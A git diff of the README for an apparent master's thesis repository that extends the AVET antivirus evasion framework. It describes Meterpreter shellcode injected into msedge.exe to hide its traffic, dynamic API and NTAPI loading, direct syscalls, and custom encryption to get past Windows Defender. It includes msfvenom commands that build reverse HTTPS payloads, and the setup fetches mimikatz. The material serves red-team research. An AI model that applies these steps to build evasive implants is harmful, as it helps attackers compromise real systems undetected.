@@ -4,16 +4,14 @@ This repository hosts the implementation of Ayoub's Master Thesis, which explore
 
 The repository also enhances the AntiVirus Evasion Tool (AVET) with several notable improvements:
 
-- Introduction of a script to build a **stageless** Meterpreter for performing a shellcode injections.
+- Introduction of a script to build a **stageless** Meterpreter performing a shellcode injection.
 - Development of a shellcode injection method that identifies the **target process by name**, automatically determining the PID. This approach is more suitable for Red Teaming scenarios than the original AVET method, which required a *PID to be specified at the command line*.
-- Addition of an advanced shellcode injection technique that uses **dynamic API loading**.
-- Implementation of a version that use **dynamic loading of NTAPIs**.
-- Addition of two versions that uses **direct syscall** using Syswhisper2 (compatible with MinGW) and Syswhisper3.
+- Addition of a shellcode injection technique that uses **dynamic API loading**.
+- Implementation of an advanced version that uses **dynamic loading of NTAPIs**.
+- Addition of two versions that uses **direct syscall** using Syswhisper2 and Syswhisper3 (both are compatible with MinGW which is used by AVET).
 - Fixed a bug in the `static_from_here` function. Previously, this function included and called `static_from_file`. However, due to the use of `#pragma once`, macros defined specifically for `static_from_here` were not available in the scope of `static_from_file` if `static_from_file` was included before its invocation by `static_from_here`.
+- A basic custom encryption using arithmetic operations has been added to bypass static detection since the encryption performed by AVET, including a basic XOR, are flagged by AV softwares (Tested against Windows Defender).
 
-- A basic XOR custom encryption has been added to bypass static detection since the encryption performed by AVET are flagged by AV softwares.
-
-Furthermore, the repository includes a custom xor encoder designed to enhance evasion capabilities, addressing the limitations of the existing AVET encoder that fails to hide the payload and the msfvenom encoder against AVs statically.
 
 ## Author
 
@@ -23,29 +21,30 @@ BOUHNINE Ayoub
 
 The repository is organized as follows:
 
-- **Custom Payloads:** Contains various custom payloads.
-- **AVET Folder:** Hosts the AVET (AntiVirus Evasion Tool).
-- **SysWhispers3 Folder:** Used for generating (or possibly statically embedding different payloads within AVET).
+- **AVET Folder:** Hosts the extended version of AVET (AntiVirus Evasion Tool) taken from [their Github](https://github.com/govolution/avet).
+- **Custom Payloads:** Contains various custom payloads that has been tested against CAPEv2 before being integrated into AVET.
 
 ## Research Paper
 
-The accompanying thesis paper is available in the [paper folder](./paper/thesis.pdf).
+The thesis paper is available in the [paper folder](./paper/thesis.pdf).
 
 ## Installing AVET
 
 __The Installtion Instruction applies for Kali 64bit and tdm-gcc!__
 
-You can use the setup script:
+To install AVET, the following command needs to be executed:
 ```bash
 ./setup.sh
 ```
 
-This should automatically get you started by installing/configuring wine and installing tdm-gcc.
-You'll shortly have to click through the tdm-gcc installer GUI though - standard settings should be fine.
-The script will also ask if you want to install AVET's dependencies, which are needed to use some of the build scripts. The fetched dependencies will be put into separate folders next to the avet folder.
+This will begin by setting up Wine and installing TDM-GCC on your system. 
 
+You will need to interact with the TDM-GCC installer's graphical interface, but the default options are typically enough. 
 
-Dependencies will grab the latest releases of:
+Additionally, the script will ask whether you wish to install the necessary dependencies for AVET to use certain build scripts. 
+These dependencies will be organized into individual directories adjacent to the AVET folder.
+
+Dependencies will take the latest releases of:
 - [pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode)
 - [mimikatz](https://github.com/gentilkiwi/mimikatz)
 - [DKMC](https://github.com/Mr-Un1k0d3r/DKMC)
@@ -53,50 +52,48 @@ Dependencies will grab the latest releases of:
 
 ## Evasion Techniques
 
-The samples, available on the directory `samples/` included in this repository use several evasion techniques:
+The samples, located in the `samples/` directory of this repository, use several evasion techniques:
 
-- **Obfuscation:** A stageless Meterpreter x64 reverse HTTPS payload that uses both the x64/xor encoding from msfvenom and a custom basic XOR encryption. This technique is implemented in all the samples.
-- **Shellcode Injection:** an injection of the Meterpreter payload is performed into **msedge.exe**, this could fool security solutions since Microsoft Edge regularly perform HTTPS requests, therefore the Meterpreter traffic will be hidden with the regular Ms Edge traffic. This is implemented in all the samples.
-- **Basic API calls:** This is not an evasion techniques however, the sample implemeting this will serve as a baseline for other sample. This is implemented in the sample `Shellcode_injection`.
-- **Dynamic API Loading:** This is a basic method used to hide the APIs from the Import Address Table. This will resolve the APIs by loading them dynamically. This is implemented in the sample `Shellcode_injection_dynamic_lib`.
-- **NTAPIs:** This is a more advances techcniques where we load the NTAPIs instead of the classical APIs dynamically. This could potentially bypass security solutions that does not hook the `ntdll.dll`. This is implemented in the sample `Shellcode_injection_NTAPIs`.
-- **Evasion of API Hooks by Direct Syscalls:** This tehcniqeus is used to bypass the API hooking of classical APIs and NTAPIs by using a Direct Syscalls technique. This is implemented in the sample `Shellcode_injection_syscalls` and `Shellcode_injection_syscalls_mingw_vsc` for a version compatible with MinGW.
+- **Obfuscation:** This involves a stageless Meterpreter x64 reverse HTTPS payload that uses both the x64/xor encoding from msfvenom and a custom basic XOR encryption. This technique is implemented in all the samples.
+- **Shellcode Injection:** The Meterpreter payload is injected into **msedge.exe**. This could deceive security solutions since Microsoft Edge frequently performs HTTPS requests, thereby hidding the Meterpreter traffic within the regular Microsoft Edge traffic. This is implemented in all the samples.
+- **Basic API calls:** Although this is not an evasion technique, the sample implementing this serves as a baseline for other samples. It is implemented in the `Shellcode_injection/` directory.
+- **Dynamic API Loading:** This technique conceals the APIs from the Import Address Table by dynamically loading the APIs. This is implemented in the sample `Shellcode_injection_dynamic_lib`.
+- **Dynamic NTAPIs Loading:** This is a more advance technique which involves dynamically loading NTAPIs instead of the classical APIs, potentially evading security solutions that do not hook the `ntdll.dll`. This is implemented in the `Shellcode_injection_NTAPIs` directory.
+- **Evasion of API Hooks by Direct Syscalls:** This technique is used to bypass the API hooking of classical APIs and NTAPIs through Direct Syscalls. This is implemented in the sample `Shellcode_injection_syscalls`, compatible with Visual Studio, `Shellcode_injection_syscalls_mingw`, compatible with MinGW
+and `Shellcode_injection_syscalls_mingw_vsc` for a version compatible with both Visual Studio and MinGW.
 
-These techniques have been integrated by the author within the AVET framework available on this repo. For syscall generation, the tool **SysWhispers3** is used, available at: [SysWhispers3 on GitHub](https://github.com/klezVirus/SysWhispers3). However since AVET uses the MinGW compilator, we also used another version of Syswhispers called **Syswhispers2**
+These techniques have been integrated by the author within the AVET framework available on this repository. For syscall generation, the tool **SysWhispers3** is used for the `Shellcode_injection_syscalls` and `Shellcode_injection_syscalls_mingw` samples. Whereas for the `Shellcode_injection_syscalls_mingw_vsc` sample, **Syswhispers2** is used. These tools are availble at: [SysWhispers3 on GitHub](https://github.com/klezVirus/SysWhispers3) and [SysWhispers2 on GitHub](https://github.com/jthuraisamy/SysWhispers2).
 
 ## Modification of the payload
 
-The payload used is stageless Meterpreter x64 reverse HTTPS payload that employs a basic XOR encryption is used. This has to be replaced if you want to use your payload with the right IP address.
+The payload employed is a stageless Meterpreter x64 reverse HTTPS payload, using the x64/xor encoder from msfvenom. Additionally, an extra layer of encryption has been implemented, which is further detailed in the [in the section _Utils_](#utils). 
+
+**Note**: To use the samples with your own IP address, the payload must be replaced.
 
 ## Utils
 
-We added some custom encryptions which has also be integrated within AVET, indeed its default encryption routines have already be used and are therefore well-known by AV vendors. This custom encryptions as well as the decryption routine could then be used to not be flag by AVET's ecnryption methods.
+We have introduced custom encryption techniques that have been integrated into AVET. Its default encryption routines are well-known to antivirus (AV) vendors and have been widely used. These custom encryption methods, along with their corresponding decryption routines, are designed to avoid detection by AVET's standard encryption methods.
+
+**Important Remark**: Our custom XOR encryption is detectable by Microsoft Defender when implemented with AVET. As a result, we have added a basic arithmetic encryption to circumvent static detection [as described in section _Custom obfucation of Meterpreter payloads_](#custom-obfucation-of-meterpreter-payloads).
 
 ### XORing Meterpreter payloads
 
-For xoring the payload we used the code available on `XOR_encryptor`.
+For XORing the payload we used the code available on `XOR_encryptor`.
 
-To do so:
-- Generate your payload using **msfvenom** : `msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.173.130 lport=443 -f c > payload.h`
-- Take the file newly generated and give it as input to the executable `XOR_encryptor.exe`, this can be used with the following command : `.\XOR_encryptor.exe payload.h <output_file_name>` for example in our case the output filename is `buffer.h `
-- Add the newly generated file into Visual Studio. Then include the file into the sample of your choice.
-You should be ready to go !
+Follow these steps:
 
-In a kali machine, ensure you have `wine` installed, then you have to simply execute the command with `wine` as a prefix and you should have your XORed payload generated.
+- Generate your payload with **msfvenom** : `msfvenom -p windows/x64/meterpreter_reverse_https lhost=eth0 lport=443 -e x64/xor -f c > payload.h`
+- Use the newly generated file as input for the `XOR_encryptor.exe` executable with the following command: `\XOR_encryptor.exe payload.h <output_file_name>`. For example, in our case, the output filename is `buffer.h `
+- Import the newly created file into Visual Studio and include it in your chosen sample.
+
+On a Kali machine, ensure `wine` is installed. You can then execute the command with `wine` as a prefix to generate your XORed payload.
 
 ### Custom obfucation of Meterpreter payloads
 
-We added another technique to obfuscate the payload. Indeed, when integrating the custom previous XOR encryption routing inside AVET, we found that it got detected by Microsoft Defender as `Trojan:Win64/CryptInject.VZ!MTB`. Indeed, this could be explained since the sample generated contains already the code of AVET if we added on top of it a XOR encryption that performs  
+We introduced an additional technique to obfuscate the payload. Indeed, upon integrating our custom XOR encryption routine into AVET, we discovered that Microsoft Defender detected it as `Trojan:Win64/CryptInject.VZ!MTB`. This detection likely occurred because the sample already contained AVET code, and the XOR encryption was added on top of it which could lead to suspicious code by AV vendors.
 
-For xoring the payload we used the code available on `XOR_encryptor`.
+To apply this technique, follow the steps outlined in [in the section _XORing Meterpreter payloads_](#xoring-meterpreter-payloads), but use `custom_encryptor` instead of `XOR_encryptor`.
 
-To do so:
-- Generate your payload using **msfvenom** : `msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.173.130 lport=443 -f c > payload.h`
-- Take the file newly generated and give it as input to the executable `XOR_encryptor.exe`, this can be used with the following command : `.\XOR_encryptor.exe payload.h <output_file_name>` for example in our case the output filename is `buffer.h `
-- Add the newly generated file into Visual Studio. Then include the file into the sample of your choice.
-You should be ready to go !
-
-In a kali machine, ensure you have `wine` installed, then you have to simply execute the command with `wine` as a prefix and you should have your XORed payload generated.
 
 ### For generating direct syscalls using Syswhisper3
 
